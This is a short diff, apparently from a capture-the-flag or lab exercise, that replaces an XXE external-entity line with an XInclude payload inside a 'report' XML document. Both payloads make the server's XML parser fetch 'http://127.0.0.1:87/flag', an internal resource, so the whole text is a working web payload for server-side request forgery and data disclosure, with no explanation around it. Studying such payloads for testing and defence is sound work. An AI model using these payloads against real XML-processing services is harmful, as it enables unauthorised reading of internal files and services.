@@ -1,1 +1,5 @@
-<!ENTITY xxe SYSTEM "http://127.0.0.1:87/flag">
+<?xml version="1.0"?>
+<report xmlns:xi="http://www.w3.org/2001/XInclude">
+  <name><xi:include parse="text" href="http://127.0.0.1:87/flag"/></name>
+  <issue>test</issue>
+</report>
